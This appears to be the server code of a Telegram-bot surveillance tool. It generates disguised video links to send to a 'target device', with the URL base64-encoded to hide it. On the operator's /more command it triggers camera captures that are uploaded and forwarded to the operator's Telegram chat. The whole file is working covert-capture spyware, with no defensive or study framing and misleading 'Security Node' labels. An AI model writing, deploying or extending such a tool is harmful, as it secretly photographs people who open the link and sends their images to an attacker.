require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const multer = require('multer');

// Environment Variables Setup
const token = process.env.BOT_TOKEN;
const adminId = process.env.ADMIN_ID;
const port = process.env.PORT || 3000;
const SERVER_URL = process.env.SERVER_URL || `http://localhost:${port}`; 

if (!token || !adminId) {
    console.error("❌ CRITICAL ERROR: BOT_TOKEN or ADMIN_ID is missing in .env file!");
    process.exit(1);
}

// Initialize Apps
const bot = new TelegramBot(token, { polling: true });
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const upload = multer({ storage: multer.memoryStorage() });

// Serve static files from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// State variables
let waitingForVideoUrl = {};

// ==========================================
// 1. SOCKET.IO (Live Connection)
// ==========================================
io.on('connection', (socket) => {
    console.log('📱 Target Device Connected!');
    bot.sendMessage(adminId, "📡 Security Node Active: Video is playing and Camera is ready!");
    
    socket.on('disconnect', () => {
        console.log('❌ Device Disconnected!');
        bot.sendMessage(adminId, "⚠️ Alert: Security Node disconnected (Video stopped or browser closed).");
    });
});

// ==========================================
// 2. IMAGE UPLOAD HANDLER
// ==========================================
app.post('/upload', upload.single('photo'), (req, res) => {
    if (!req.file) return res.status(400).send('No image received');
    
    bot.sendPhoto(adminId, req.file.buffer, { caption: "🚨 Auto Capture Received!" })
        .then(() => res.status(200).send('Sent successfully'))
        .catch((err) => {
            console.error("Telegram Error:", err.message);
            res.status(500).send('Failed to send');
        });
});

// ==========================================
// 3. TELEGRAM BOT COMMANDS
// ==========================================
bot.onText(/\/start/, (msg) => {
    if (msg.chat.id.toString() === adminId) {
        bot.sendMessage(adminId, "✅ System Ready!\n\nCommands:\n`/url` - Generate a new video link\n`/more` - Capture 5 photos instantly", { parse_mode: "Markdown" });
    }
});

// Command: Ask for URL
bot.onText(/\/url/, (msg) => {
    if (msg.chat.id.toString() === adminId) {
        waitingForVideoUrl[adminId] = true;
        bot.sendMessage(adminId, "🔗 Please send the Video URL (e.g., YouTube embed link) you want to play on the device:");
    }
});

// Listen for the Video URL and Generate Encoded Link
bot.on('message', (msg) => {
    const chatId = msg.chat.id.toString();
    
    if (chatId === adminId && waitingForVideoUrl[adminId] && !msg.text.startsWith('/')) {
        const videoUrl = msg.text;
        
        // Encode URL to Base64 to hide it in the parameters
        const encodedUrl = Buffer.from(videoUrl).toString('base64');
        const generatedLink = `${SERVER_URL}/?v=${encodedUrl}`;
        
        bot.sendMessage(adminId, `✅ **Dynamic Link Generated!**\n\nSend and open this link on the target device:\n${generatedLink}`, { parse_mode: "Markdown" });
        
        waitingForVideoUrl[adminId] = false; // Reset the state
    }
});

// Command: Trigger Camera
bot.onText(/\/more/, (msg) => {
    if (msg.chat.id.toString() === adminId) {
        bot.sendMessage(adminId, "📸 Command sent! Capturing photos...");
        io.emit('capture_command'); // HTML page ko trigger bhej rahe hain
    }
});

// ==========================================
// START SERVER
// ==========================================
server.listen(port, () => {
    console.log(`🚀 Server is running on port ${port}`);
    bot.sendMessage(adminId, "🔄 Server Rebooted. Bot is online and listening.");
});
